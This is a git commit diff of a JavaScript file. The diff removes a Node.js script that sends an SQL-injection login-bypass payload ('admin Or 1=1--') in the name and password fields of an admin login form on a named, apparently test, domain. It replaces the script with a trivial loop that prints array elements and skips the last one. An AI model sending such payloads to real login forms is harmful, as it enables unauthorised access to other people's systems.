c90f1d2d25aa05ddb9cdeb0d2b1367e809cc8f1d
kaps <kapil.designshore@gmail.com>
2023-05-19 09:30:41 +0530

    Here is the change for brute force algo

--- runcode.js
+++ runcode.js
@@ -1,29 +1,11 @@
-const http = require("https");
+const arr = ['k','a']
+let i=0;
+function test(){
+   
 
-const options = {
-  "method": "POST",
-  "hostname": "designshoretest.com",
-  "port": null,
-  "path": "/01dk/passwordsetup/admin.php",
-  "headers": {
-    "Accept": "*/*",
-    "User-Agent": "Thunder Client (https://www.thunderclient.com)",
-    "content-type": "multipart/form-data; boundary=---011000010111000001101001"
-  }
-};
+    for(let i=0;i<arr.length - 1;i++)
+        console.log(arr[i])
+    
+}
 
-const req = http.request(options, function (res) {
-  const chunks = [];
-
-  res.on("data", function (chunk) {
-    chunks.push(chunk);
-  });
-
-  res.on("end", function () {
-    const body = Buffer.concat(chunks);
-    console.log(body.toString());
-  });
-});
-
-req.write("-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nadmin Or 1=1--\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\nadmin Or 1=1--\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"login\"\r\n\r\n\r\n-----011000010111000001101001--\r\n");
-req.end();
+test();
